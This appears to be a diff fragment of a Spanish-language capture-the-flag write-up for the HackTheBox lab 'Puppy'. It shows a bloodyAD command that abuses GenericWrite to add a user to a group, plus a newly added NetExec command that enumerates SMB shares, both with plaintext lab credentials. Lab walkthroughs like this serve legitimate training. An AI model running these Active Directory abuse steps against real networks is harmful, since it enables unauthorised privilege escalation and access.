@@ -66,6 +66,8 @@ Subimos el archivo a bloodhound
 Añadimos usuario a grupo DEVELOPERS por que tenemos generic write
 `bloodyAD --host $IP -d puppy.htb -u 'levi.james' -p 'KingofAkron2025!' add groupMember 'DEVELOPERS' 'levi.james'`
 
+Como nos hemos vovemos a acceder al smb y vemos que tenmos acceso a DEV
+`nxc smb $IP -u 'levi.james' -p 'KingofAkron2025!' --shares `
 
 
 
